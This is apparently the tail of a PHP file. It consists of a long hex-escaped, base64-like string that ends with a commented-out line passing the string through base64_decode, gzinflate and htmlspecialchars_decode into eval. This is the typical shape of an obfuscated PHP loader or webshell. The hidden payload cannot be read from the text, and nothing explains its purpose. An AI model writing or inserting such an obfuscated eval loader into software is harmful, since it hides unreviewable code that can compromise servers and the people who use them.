/\x43/ZhdztHsnoZ5Fh1UPznqrDwvSPrGdzQ1MdUeXgj\x618Lk\x41\x61\x62Vo\x61zOt9fq6XgfueNJ6pTlk4xiLVXGrsITHwiT9LsG\x63w\x41np\x2b\x42lODq\x61rpUW\x42\x63\x42o2XEY\x62rNPE1/Pk0\x61\x43SQ\x436\x610\x62/JfVh0\x63vI\x62GF0U5kmq77iH0G6Jwye16NRQWm4hG9SER7NtQG9h6\x62\x2bzfjVNRDj\x62WUsqoj1VDWXOwRUIpx6uY6JTRkzO5K4sL/8G1\x2bGV1eHr\x611fyOiqN\x426O\x42HR1yFXQvd\x61sv\x42OL\x6262HvIoO6e0tGKYTUZhuwUmqKSFJZjxYezXkhJj\x62WHgtqp\x43ZHIFEd1\x62rqZ9\x61UR\x418\x2bxXmD\x4305DuYP\x62nzO5kQ\x2bI\x62D\x61XH\x62e1iklu/\x2bNdlqHtXs5r\x2bL25Of5d1I\x62euqLv\x62sG6s0p\x43/T\x618eozDzWe\x43w\x62QJ0n8fwE\x4152h\x61dMNS\x62/x01qDru\x4110H5ntvmXf\x42\x43LLJi7\x41GMpl\x61gF7xSqMN1\x426\x41ti1IJ2QgHZ\x62eZnrx2Mwl\x61\x61OksWDRn9K\x422N79REQzOPFVqtqoLoFJ/OKHI3ijp\x41K4YRfqKJys4P3JPS\x61sRmxS\x42E70qfU/SfqLww/TtzKo7nf\x41LpRyQ\x63vU\x2bF5Lu4DzQdX9guy/x\x6119F6Y1XR\x62k\x42o9\x42Zq\x62g\x2bj/rMH\x61MQQTXgk/wT9SjpjMD\x42nIsxj\x41O\x41iINJ\x42H\x621z8\x41\x43Vgd8NQUM7SwpRJVSRKioYWffPxER\x436J\x2bmT7w6G\x6200M7UZm59Q5US\x62eLRlS2\x61k0NJ\x41Q\x41hD\x41IWZd05Y9\x42lsMNTVsSrfxRQWfOJ/e\x43iLK4\x63nFLe0slQvP\x42/ENwv5sI7H\x61OWqLGJ5uh\x41VpOZdOtq5VJq\x62WYwH7s32IPELQrkrv8V4yK9EYePKf5f56182nuIEI6etfw9ns7sf9XTy3y6novP2QwnP\x43H93378S3/33f76P/YlEJPIspG\x43zurM06tMretprk6MrVER3G/\x2bex0SjjfzQfdItMFF92l9opJ6Vdo64kqFKx21VF498WZ6HomnE4qHYXjkxHifsSo\x42wE6/y6qVdHHjrtU01eUH72LRYTy6V\x41hqrk8\x61x77vfVRfUYs7\x41Jtm85L/77YDUXQVwfG5ve\x61\x62K\x63sS\x62t\x62ZVisUfss\x62t1OuD01Yq2z2FTvv/6xZnWrYqq\x62LxWVJV174v/IJ/LDLeMPPWsYze\x41ksVSWHe6SNYi\x42y\x41\x43vr3EqDqfl\x2bfr7/Ro/oqXrq1xqT/HvHL4IlE\x41Qgio\x41m\x41\x41uoSmNQElJ\x61GpSKZ2p08RUgl6MVnhQ8/yexN\x2bgYrxj\x62X292\x2buGRUu\x42wJe7uDREHwu2QUy\x42wJe7u\x43RUHwumQU2\x42wJe7u\x42RkHwuWQU6\x42wJe";
// eval(htmlspecialchars_decode(gzinflate(base64_decode($swc))));
// ?>

